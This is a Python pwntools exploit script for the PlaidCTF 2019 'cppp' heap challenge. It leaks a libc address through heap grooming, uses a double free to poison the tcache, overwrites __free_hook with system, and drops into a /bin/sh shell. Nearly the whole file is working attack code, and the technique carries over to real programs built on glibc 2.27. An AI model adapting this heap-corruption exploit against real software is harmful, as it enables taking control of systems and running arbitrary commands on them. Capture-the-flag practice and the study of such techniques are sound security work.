# This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-12-PlaidCTF/README.md#150-pwnable--cppp

from pwn import *

target = process('./cpp', env={"LD_PRELOAD":"./libc-2.27.so"})

gdb.attach(target)
#gdb.attach(target, gdbscript = 'pie b *0x167e')
#gdb.attach(target, gdbscript = 'pie b *0x1475')

libc = ELF("./libc-2.27.so")

# Establish functions to handle I/O with target
def add(name, buff):
    print target.recvuntil("Exit\n")
    target.sendline("1")
    target.sendline(name)
    print target.recvuntil("buf:")
    target.sendline(buff)
    print target.recvuntil("Done!")

def remove(index):
    print target.recvuntil("Exit\n")
    target.sendline("2")
    print target.recvuntil("idx: ")
    target.sendline(str(index))
    print target.recvuntil("Done!")

def view(index):
     print target.recvuntil("Exit\n")
     target.sendline("3")
     print target.recvuntil("idx: ")
     target.sendline(str(index))
     leak = target.recvline()
     leak = leak.strip("\n")
     leak = u64(leak + "\x00"*(8-len(leak)))
     print target.recvuntil("Done!")
     return leak


# Add the strings for the libc infoleak
add("0", "1")
add("2"*0x1000, "3"*0x1000)
add("3", "4")
add("3", "4")
add("3", "4")
add("3", "4")

# Remove the strings to groom the heap for the libc infoleak
remove(5)
remove(4)
remove(3)
remove(2)
remove(0)

# Leak the libc address, and calculate the base
libcLeak = view(0)
libcBase = libcLeak - 0x3ebca0
log.info("libc base: " + hex(libcBase))

# Clear out the tcache (this and the next block)
add("1", "1")
add("1", "1")
add("1", "1")

# Setup double free for tcache poisoning (finish clearing out tcache)
add("1", "1")
add("2", "2")

# Execute tcache poisoning via double free
remove(1)
remove(1)

# Use double free to allocate chunk that is also in tcache bin
# Overwrite next pointer for tcache entry at the head with that of __free_hook
# Also allocate next chunk, so next chunk allocated will be to __free_hook
add("15935728", p64(libcBase + libc.symbols["__free_hook"]))

# Allocate next chunk from tcache_bin which will be to __free_hook
# Write libc address of system to it
add("1", p64(libcBase + libc.symbols["system"]))

# Execute system("/bin/sh")
# Buf string is passed to free, which we overwrote __free_hook with system
target.sendline("1")
target.recvuntil("name: ")
target.sendline("guyinatuxedo")
target.recvuntil("buf: ")
target.sendline("/bin/sh")

# Drop to an interactive shell
target.interactive()
